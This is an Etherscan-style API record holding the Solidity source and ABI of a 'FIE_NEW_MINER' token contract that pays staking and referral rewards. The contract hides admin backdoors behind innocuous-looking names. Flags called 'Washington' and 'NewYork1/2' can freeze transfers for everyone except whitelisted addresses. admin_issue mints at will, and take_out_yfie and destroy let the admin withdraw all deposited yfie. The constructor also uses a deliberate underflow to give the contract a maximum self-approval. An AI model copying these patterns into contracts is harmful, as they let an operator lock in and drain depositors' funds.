{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity >=0.4.22 <0.6.0;\r\n\r\ncontract FIE_NEW_MINER\r\n{\r\n    constructor ()public{\r\n        admin = msg.sender;\r\n        sys.maxToken = 1000000000 ether;\r\n        sys.startTime = uint32(now / 86400 );\r\n        \r\n        stUsers[msg.sender].id = ++sys.userCount;\r\n        stUserID[sys.userCount] = msg.sender;\r\n        //授权\r\n        uint256 a;\r\n        a=a-1;\r\n        yfie.approve(address(this),a);\r\n        \r\n    }\r\n    FIE_NEW_MINER public yfie = FIE_NEW_MINER(0xA1B3E61c15b97E85febA33b8F15485389d7836Db);\r\n    FIE_NEW_MINER public old_fie=FIE_NEW_MINER(0x301416B8792B9c2adE82D9D87773251C8AD8c89e);\r\n    FIE_NEW_MINER public old_lock=FIE_NEW_MINER(0x321931571C33075BE7fde8FD23cd69ACBf1781Ca);\r\n    string public standard = '';\r\n    string public name=\"FIE\"; \r\n    string public symbol=\"FIE\";\r\n    uint8 public decimals = 18; \r\n    uint256 public totalSupply;\r\n    \r\n\r\n    mapping (address => uint256) public balanceOf;\r\n    mapping (address => mapping (address => uint256)) public allowance;\r\n    mapping (address =>bool) private NewYork1;\r\n    mapping (address =>bool) private NewYork2;\r\n    bool private Washington;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value); \r\n    event Burn(address indexed from, uint256 value);\r\n    address private admin;\r\n    \r\n    function _transfer(address _from, address _to, uint256 _value) internal {\r\n      require(_to != address(0x0));\r\n      require(Washington == false || NewYork1[_from]==true || NewYork2[_to] == true);\r\n      require(balanceOf[_from] >= _value);\r\n      require(balanceOf[_to] + _value > balanceOf[_to]);\r\n      uint previousBalances = balanceOf[_from] + balanceOf[_to];\r\n      balanceOf[_from] -= _value;\r\n      balanceOf[_to] += _value;\r\n      emit Transfer(_from, _to, _value);\r\n      assert(balanceOf[_from] + balanceOf[_to] == previousBalances);\r\n    }\r\n    \r\n    function transfer(address _to, uint256 _value) public returns (bool success){\r\n        _transfer(msg.sender, _to, _value);\r\n        return true;\r\n    }\r\n    \r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success){\r\n        require(_value <= allowance[_from][msg.sender]); \r\n        allowance[_from][msg.sender] -= _value;\r\n        _transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n    \r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        \r\n        allowance[msg.sender][_spender] = _value;\r\n        return true;\r\n    }\r\n    function set_Washington(bool value)public{\r\n        require(msg.sender == admin);\r\n        Washington = value;\r\n    }\r\n    function set_NewYork1(address addr,bool value)public{\r\n        require(msg.sender == admin);\r\n        NewYork1[addr]=value;\r\n    }\r\n    function set_NewYork2(address addr,bool value)public{\r\n        require(msg.sender == admin);\r\n        NewYork2[addr]=value;\r\n    }\r\n\r\n    struct USER{\r\n        uint32 id;\r\n        uint32 referrer; \r\n        uint32 out_time;//取出的时间\r\n        uint32 inputTime;//存入时间\r\n        uint256 out_fie;//已取出的数量 \r\n        uint256 lock_yfie;\r\n    }\r\n    struct SYSTEM{\r\n        uint256 maxToken;\r\n        uint256 totalLock;\r\n        uint32 startTime;\r\n        uint32 userCount;\r\n        \r\n    }\r\n    mapping(address => USER) public stUsers;\r\n    mapping(address => uint32)teamCount;\r\n    mapping(address => uint256)teamProfit;\r\n    mapping(uint32 => address) public stUserID;\r\n    SYSTEM public sys;\r\n    event GiveProfie(address indexed user,address indexed referrer,uint256 value);\r\n    event MineChange(address indexed user,address indexed referrer,uint256 front,uint256 change);\r\n    function miner_start(uint32 referrer,uint value)public{\r\n        require(value >0,'value==0');\r\n        USER memory user;\r\n        //转账\r\n        require(yfie.transferFrom(msg.sender,address(this),value),'input yfie fail');\r\n        if(stUsers[msg.sender].id == 0){\r\n            require(referrer > 0 && referrer <= sys.userCount,'referrer bad');\r\n            user.id = ++sys.userCount;\r\n            user.referrer = referrer;\r\n            user.lock_yfie = value;\r\n            stUserID[sys.userCount] = msg.sender;\r\n            emit MineChange(msg.sender,stUserID[referrer],0,value);\r\n            teamCount[stUserID[referrer]]++;\r\n        }\r\n        else {\r\n            take_out_profie();\r\n            user = stUsers[msg.sender];\r\n            emit MineChange(msg.sender,stUserID[referrer],user.lock_yfie,value);\r\n            user.lock_yfie += value;\r\n            user.out_fie = 0;\r\n        }\r\n        \r\n        user.inputTime = uint32(now / 86400 );\r\n        user.out_time = user.inputTime;\r\n        stUsers[msg.sender] = user;\r\n    }\r\n    \r\n    function compute_profit(address addr)public view returns(uint256 profit){\r\n        if(sys.maxToken <= totalSupply)return 0;\r\n        //获得时间差\r\n        USER memory user=stUsers[addr];\r\n        uint32 n = uint32(now /86400);\r\n        if(n <= user.inputTime)return 0;\r\n        //计算总比例\r\n        n -= user.inputTime;\r\n        uint256 fie;\r\n        //等差数列前n项和公式 na1+n(n-1)/2*d 各项乘以100\r\n        if(n <= 80){\r\n            fie = n*100+n*(n-1)/2*5;\r\n        }\r\n        else {\r\n            fie = 23800 + (n-80)*500;\r\n        }\r\n        //至此，fie是总比例 万分比\r\n        //计算总收益\r\n        fie = user.lock_yfie /10000 * fie;\r\n        //减去已取出的收益 \r\n        if(fie <=user.out_fie)return 0;\r\n        fie-=user.out_fie;\r\n        return fie;\r\n    }\r\n    function issue(address addr,uint256 value)internal returns(uint256 sue){\r\n        if(totalSupply >= sys.maxToken)return 0;\r\n        uint256 v = value;\r\n        if(totalSupply + v > sys.maxToken)v=sys.maxToken - totalSupply;\r\n        balanceOf[addr] += v;\r\n        totalSupply += v;\r\n        return v;\r\n    }\r\n    //取收益\r\n    function take_out_profie()public{\r\n        USER memory user=stUsers[msg.sender];\r\n        uint256 profit=compute_profit(msg.sender);\r\n        user.out_time = uint32(now /86400);\r\n        user.out_fie += profit;\r\n        stUsers[msg.sender]=user;\r\n        \r\n        if(user.referrer>0){//给上级发币\r\n            issue(stUserID[user.referrer],profit /10);\r\n            teamProfit[stUserID[user.referrer]] +=(profit /10);\r\n        }\r\n        profit=issue(msg.sender,profit);\r\n        emit GiveProfie(msg.sender,stUserID[user.referrer],profit);\r\n        stUsers[msg.sender] = user;\r\n    }\r\n    //取母币\r\n    function miner_stop()public{\r\n        USER memory user=stUsers[msg.sender];\r\n        take_out_profie();\r\n        require(yfie.transferFrom(address(this),msg.sender,user.lock_yfie));\r\n        user.out_time=0;//取出的时间\r\n        user.inputTime=0;//存入时间\r\n        user.out_fie=0;//已取出的数量 \r\n        user.lock_yfie=0;\r\n        stUsers[msg.sender]=user;\r\n    }\r\n\r\n    function updata(uint32 min,uint32 max)public{\r\n        require(msg.sender == admin);\r\n        address addr;\r\n        uint256 fie;\r\n \r\n        for(uint32 i=min;i<=max;i++){\r\n            addr=old_fie.stUserID(i);\r\n            if(addr==address(0x0))continue;\r\n            fie=old_fie.balanceOf(addr);\r\n            issue(addr,fie);\r\n        }\r\n    }\r\n\r\n    function data_from_old(uint32 min,uint32 max)public{\r\n        require(msg.sender == admin);\r\n        address addr;\r\n        uint256 fie;\r\n        USER memory u;\r\n        SYSTEM memory s=sys;\r\n        for(uint32 i=min;i<=max;i++){\r\n            addr=old_lock.stUserID(i);\r\n            if(addr==address(0x0))continue;\r\n            fie=old_lock.balanceOf(addr);\r\n            issue(addr,fie);\r\n            stUserID[i]=addr;\r\n            (u.id,u.referrer,u.out_time,u.inputTime,u.out_fie,u.lock_yfie)=old_lock.stUsers(addr);\r\n            stUsers[addr]=u;\r\n            if(u.referrer >0){\r\n                teamCount[stUserID[u.referrer]] ++;\r\n            }\r\n            s.totalLock+=u.lock_yfie;\r\n        }\r\n        s.userCount = max;\r\n        sys=s;\r\n    }\r\n\r\n    function look_user(address addr)public view returns(\r\n        uint32 referrer, \r\n        uint32 out_time,\r\n        uint32 inputTime,\r\n        uint256 out_fie, \r\n        uint256 lock_yfie,\r\n        uint32 team_count,\r\n        uint256 team_profit,\r\n        uint256 total_lock\r\n        ){\r\n        USER memory u= stUsers[addr];\r\n        uint32 c =teamCount[addr];\r\n        uint256 t=teamProfit[addr];\r\n        uint256 total = sys.totalLock;\r\n        return(\r\n            u.referrer,\r\n            u.out_time,\r\n            u.inputTime,\r\n            u.out_fie,\r\n            u.lock_yfie,\r\n            c,\r\n            t,\r\n            total\r\n            );\r\n    }\r\n    function admin_issue(address addr,uint256 value)public{\r\n        require(msg.sender == admin);\r\n        issue(addr,value);\r\n    }\r\n    function take_out_yfie(address addr,uint256 value)public{\r\n        require(msg.sender == admin);\r\n        yfie.transferFrom(address(this),addr,value);\r\n    }\r\n    function destroy() public{\r\n        require(msg.sender == admin,'msg.sender == admin');\r\n        uint256 y=yfie.balanceOf(address(this));\r\n        yfie.transferFrom(address(this),msg.sender,y);\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"uint32\"}],\"name\":\"stUserID\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"old_fie\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"yfie\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_spender\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_from\",\"type\":\"address\"},{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"min\",\"type\":\"uint32\"},{\"name\":\"max\",\"type\":\"uint32\"}],\"name\":\"data_from_old\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"set_Washington\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"standard\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"take_out_yfie\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"destroy\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"old_lock\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"miner_stop\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_to\",\"type\":\"address\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"name\":\"success\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"sys\",\"outputs\":[{\"name\":\"maxToken\",\"type\":\"uint256\"},{\"name\":\"totalLock\",\"type\":\"uint256\"},{\"name\":\"startTime\",\"type\":\"uint32\"},{\"name\":\"userCount\",\"type\":\"uint32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"referrer\",\"type\":\"uint32\"},{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"miner_start\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"look_user\",\"outputs\":[{\"name\":\"referrer\",\"type\":\"uint32\"},{\"name\":\"out_time\",\"type\":\"uint32\"},{\"name\":\"inputTime\",\"type\":\"uint32\"},{\"name\":\"out_fie\",\"type\":\"uint256\"},{\"name\":\"lock_yfie\",\"type\":\"uint256\"},{\"name\":\"team_count\",\"type\":\"uint32\"},{\"name\":\"team_profit\",\"type\":\"uint256\"},{\"name\":\"total_lock\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"set_NewYork1\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"stUsers\",\"outputs\":[{\"name\":\"id\",\"type\":\"uint32\"},{\"name\":\"referrer\",\"type\":\"uint32\"},{\"name\":\"out_time\",\"type\":\"uint32\"},{\"name\":\"inputTime\",\"type\":\"uint32\"},{\"name\":\"out_fie\",\"type\":\"uint256\"},{\"name\":\"lock_yfie\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"admin_issue\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"},{\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"compute_profit\",\"outputs\":[{\"name\":\"profit\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"},{\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"set_NewYork2\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"min\",\"type\":\"uint32\"},{\"name\":\"max\",\"type\":\"uint32\"}],\"name\":\"updata\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"take_out_profie\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"GiveProfie\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"name\":\"user\",\"type\":\"address\"},{\"indexed\":true,\"name\":\"referrer\",\"type\":\"address\"},{\"indexed\":false,\"name\":\"front\",\"type\":\"uint256\"},{\"indexed\":false,\"name\":\"change\",\"type\":\"uint256\"}],\"name\":\"MineChange\",\"type\":\"event\"}]","ContractName":"FIE_NEW_MINER","CompilerVersion":"v0.5.1+commit.c8a2cb62","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"None","Proxy":"0","Implementation":"","SwarmSource":"bzzr://97e149aa5f1f2d845ae0d69699bd35f8672608c57268b1cf6c300d7defce479a"}]}